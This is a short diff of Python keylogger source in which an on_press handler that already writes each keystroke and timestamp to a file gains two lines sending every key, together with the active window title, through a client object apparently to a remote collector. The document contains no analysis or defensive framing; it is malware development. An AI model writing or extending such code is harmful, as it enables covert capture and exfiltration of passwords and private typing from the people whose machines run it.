@@ -121,8 +121,10 @@ def on_press(key):
                 last_window_title = current_window_title
 
             if hasattr(key, 'char') and key.char:
+                cln.send_key_non_blocking(f'[{timestamp}] Key: {key.char} Window: {current_window_title}')
                 f.write(f'[{timestamp}] Key: {key.char}\n')
             else:
+                cln.send_key_non_blocking(f'[{timestamp}] Special: {key} Window: {current_window_title}')
                 f.write(f'[{timestamp}] Special: {key}\n')
 
     except Exception as e:
